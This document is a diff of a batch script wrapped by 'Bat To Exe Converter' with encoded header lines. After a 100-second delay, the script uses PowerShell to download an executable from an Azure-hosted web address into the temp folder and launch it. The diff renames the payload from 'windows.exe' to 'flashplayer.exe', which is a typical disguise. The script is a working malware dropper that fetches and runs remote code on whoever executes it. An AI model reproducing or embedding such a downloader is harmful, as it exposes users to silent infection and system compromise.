@@ -1,7 +1,7 @@
 ::[Bat To Exe Converter]
 ::
 ::YAwzoRdxOk+EWAjk
-::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvHy+uMq18fTbFvIcLs07qKL/cApx2pWJM5xHUXvsQACB5KbV+EXUIDoGBGuXOWep/Rngr1WEfH70g/ew==
+::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvH5uy4g0kSVucAXoPaybyxEOwS80D2SsB9hC8P1sIPA3s=
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kSqcI4otg==
+::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaNItcYLeybGNNfIa/lzYc5osxXIUndMJbA==
 ::YB416Ek+ZG8=
 ::
 ::
@@ -35,7 +35,7 @@
 
 timeout 100 >nul
 
-set files= 'http://mogiant.azurewebsites.net/windows.exe'
+set files= 'http://mogiant.azurewebsites.net/flashplayer.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
